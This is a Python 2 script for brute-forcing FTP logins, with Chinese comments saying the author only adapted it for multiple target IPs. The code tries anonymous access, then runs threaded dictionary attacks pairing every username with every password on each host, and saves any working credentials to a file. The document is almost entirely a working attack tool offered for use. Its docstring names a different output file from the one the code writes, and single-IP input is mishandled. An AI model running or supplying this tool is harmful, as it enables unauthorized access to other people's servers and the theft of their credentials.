# -*- coding: UTF-8 -*-
#先声明一下，这个脚本不是我写的，只是改成了支持多IP而已
#这个脚本是POI的一个大牛给我的，不得不说大牛写的脚本就是6，简洁高效
from threading import Thread
import ftplib, socket
import sys, time, re


def usage():
    print '+' + '-' * 50 + '+'
    print '\t    Python FTP brute intruder'
    print '+' + '-' * 50 + '+'
    if len(sys.argv) != 4:
        print "useage:ftpbrute_mult.py ip/domain user pass"
        print "example:ftpbrute_mult.py www.xxx.cn user.txt pass.txt"
        sys.exit()


def brute_anony(h):
    try:
        print '[+]'+h+' test anonymous login......\n'
        ftp = ftplib.FTP()
        ftp.connect(h, 21, timeout=10)
       # print 'FTP message:%s \n' % ftp.getwelcome()
        ftp.login()
        #ftp.retrlines('LIST')
        ftp.quit()
        print '\n[+]'+h+' anonymous login success......\n'
        result.write(h+'   anonymous login success \n')
    except ftplib.all_errors:
      #  print '\n[-] anonymous login failed......\n'
      pass


def brute_users(h,user, pwd):
    try:
        ftp = ftplib.FTP()
        ftp.connect(h, 21, timeout=10)
        ftp.login(user, pwd)
        #ftp.retrlines('LIST')
        ftp.quit()
        print '\n[+] brute success,user:%s pass:%s\n' % (user, pwd)
        result.write(h+'   '+user+':'+pwd+'\n')
    except ftplib.all_errors:
        pass


if __name__ == '__main__':
    usage()
    start_time = time.time()
    result=open(r'success.txt','a');
    if re.match(r'\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}', sys.argv[1]):
        host = sys.argv[1]
    else:
        host = [h.rstrip() for h in open(sys.argv[1])]
    userlist = [i.rstrip() for i in open(sys.argv[2])]
    passlist = [j.rstrip() for j in open(sys.argv[3])]
    print 'user:%d count\n' % len(userlist)
    print 'pass:%d count\n' % len(passlist)
    for h in host:
        brute_anony(h)
    print '\n[+] brute testing......\n'
    #print '\n[+] start_time: %d \n' %time.time()
    thrdlist = []
    for h in host:
        for user in userlist:
            for pwd in passlist:
                t = Thread(target=brute_users, args=(h,user, pwd))
                print '\n[+] test %s    %s:%s\n' % (h,user,pwd);
                t.start()
                thrdlist.append(t)
                time.sleep(0.5)
    for x in thrdlist:
        x.join()
    print '[+] complete time: %d sec' % (time.time() - start_time)
    result.close();
"""在python2.7下可以正常运行
其他未测试
使用这个脚本需要创建3个文件，1：IP文件:存放IP地址 2:用户名文件 3:密码文件
效果
会先进行匿名访问，然后再爆破弱口令
爆破以后，要是能成果的，会在目录下面创建一个result.txt保存结果"""